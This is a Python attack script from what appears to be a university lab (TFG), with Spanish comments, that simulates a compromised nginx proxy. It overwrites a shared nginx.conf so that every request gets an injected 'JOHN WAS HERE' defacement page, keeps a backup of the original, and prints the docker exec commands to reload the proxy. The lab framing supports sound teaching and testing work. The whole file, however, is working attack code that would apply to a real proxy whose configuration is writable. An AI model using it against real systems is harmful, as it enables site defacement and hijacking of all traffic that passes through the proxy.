#!/usr/bin/env python3
"""
Ataque 6 — Proxy Config Injection (Proxy Compromise)

Mecanismo:
  1. John modifica /scripts/nginx.conf (volumen compartido con el proxy)
     para sustituir la directiva proxy_pass por un return 200 con contenido
     inyectado, simulando un proxy nginx comprometido.
  2. El operador (o el test) recarga nginx en el proxy:
       docker exec proxy cp /scripts/nginx.conf /etc/nginx/nginx.conf
       docker exec proxy nginx -s reload
  3. A partir de ese momento, TODO el trafico HTTP que pase por el proxy
     recibe la pagina inyectada por John, sin necesidad de MitM ni de
     interceptar trafico de red.
  4. El ataque afecta a TODOS los clientes del proxy simultaneamente.

Diferencia con TCP injection:
  - No requiere MitM ni manipulacion de paquetes
  - El proxy es el actor activo: el es quien sirve el contenido falso
  - Simula un escenario real de proxy comprometido (insider, webshell, etc.)

Stop: restaura nginx.conf original. El operador recarga nginx para limpiar.

Uso: python3 attack_proxy.py [start|stop|status]
"""

import sys
import os
import signal
import time

PID_FILE   = "/tmp/attack_proxy.pid"
LOG_FILE   = "/tmp/attack_proxy.log"
NGINX_CONF = "/scripts/nginx.conf"
NGINX_BAK  = "/scripts/nginx.conf.bak"

INJECTED_CONF = r"""events {
    worker_connections 1024;
}

http {
    log_format proxy '$remote_addr -> $upstream_addr [$time_local] '
                     '"$request" $status $body_bytes_sent';
    access_log /var/log/nginx/access.log proxy;
    error_log  /var/log/nginx/error.log;

    server {
        listen 80;
        location / {
            default_type text/html;
            return 200 '<html><head><title>PROXY COMPROMES</title></head>
<body style="background:#c00;color:#fff;font-family:monospace;text-align:center;padding-top:80px">
<h1>&#x26A0; JOHN WAS HERE &#x26A0;</h1>
<h2>Proxy Nginx Compromes</h2>
<p>La configuracio del proxy nginx ha estat modificada per John.</p>
<p>Tot el trafic HTTP que passa per aquest intermediari esta sota control de latacant.</p>
<p>Atac: Manipulacio del proxy intermediari (TFG Lab)</p>
</body></html>';
        }
    }
}
"""


def attack_loop():
    print("[PROXY] Configuracion nginx inyectada activa.", flush=True)
    print("[PROXY] INJECTED: proxy nginx sirviendo contenido de John.", flush=True)
    print(f"[PROXY] Config original guardada en {NGINX_BAK}", flush=True)
    print("[PROXY] Reload pendiente: docker exec proxy cp /scripts/nginx.conf /etc/nginx/nginx.conf && docker exec proxy nginx -s reload", flush=True)

    def handle_sigterm(sig, frame):
        print("[PROXY] SIGTERM recibido. Config restaurada por stop().", flush=True)
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_sigterm)
    while True:
        time.sleep(60)


def start():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        print(f"[!] El ataque ya esta activo (PID {pid}). Para primero con 'stop'.")
        sys.exit(1)

    if not os.path.exists(NGINX_CONF):
        print(f"[!] No se encuentra {NGINX_CONF}. Verifica que el volumen /scripts esta montado.")
        sys.exit(1)

    # Guardar backup del config original
    with open(NGINX_CONF, "r") as f:
        original = f.read()
    with open(NGINX_BAK, "w") as f:
        f.write(original)

    # Escribir config inyectada
    with open(NGINX_CONF, "w") as f:
        f.write(INJECTED_CONF)

    pid = os.fork()
    if pid > 0:
        open(PID_FILE, "w").write(str(pid))
        print(f"[+] Proxy Config Injection iniciado (PID {pid})")
        print(f"    nginx.conf modificado en {NGINX_CONF}")
        print(f"    Backup original en {NGINX_BAK}")
        print(f"    Activa el ataque recargando nginx:")
        print(f"      docker exec proxy cp /scripts/nginx.conf /etc/nginx/nginx.conf")
        print(f"      docker exec proxy nginx -s reload")
        print(f"    Verifica: docker exec alice wget -qO- http://192.168.4.2/")
        print(f"    Log: tail -f {LOG_FILE}")
        sys.exit(0)

    os.setsid()
    sys.stdout = open(LOG_FILE, "w", buffering=1)
    sys.stderr = sys.stdout
    attack_loop()


def stop():
    if not os.path.exists(PID_FILE):
        print("[-] El ataque no esta activo.")
        return

    pid = int(open(PID_FILE).read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(1)
        if os.path.exists(f"/proc/{pid}"):
            os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        print("[!] Proceso no encontrado, limpiando PID file.")

    os.remove(PID_FILE)

    # Restaurar config original
    if os.path.exists(NGINX_BAK):
        with open(NGINX_BAK, "r") as f:
            original = f.read()
        with open(NGINX_CONF, "w") as f:
            f.write(original)
        os.remove(NGINX_BAK)
        print("[+] Proxy Config Injection detenido. nginx.conf restaurado.")
    else:
        print("[!] No se encontro backup. Restaura manualmente nginx.conf.")

    print(f"    Recarga nginx para aplicar: docker exec proxy cp /scripts/nginx.conf /etc/nginx/nginx.conf && docker exec proxy nginx -s reload")


def status():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        alive = os.path.exists(f"/proc/{pid}")
        state = "activo" if alive else "PID file huerfano"
        print(f"[*] Proxy Config Injection: {state} (PID {pid})")
        injected = os.path.exists(NGINX_BAK)
        print(f"    nginx.conf inyectado: {'si' if injected else 'no (backup no encontrado)'}")
        print(f"    Log: tail -f {LOG_FILE}")
    else:
        print("[-] Proxy Config Injection: inactivo")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("start", "stop", "status"):
        print(f"Uso: {sys.argv[0]} [start|stop|status]")
        sys.exit(1)
    {"start": start, "stop": stop, "status": status}[sys.argv[1]]()
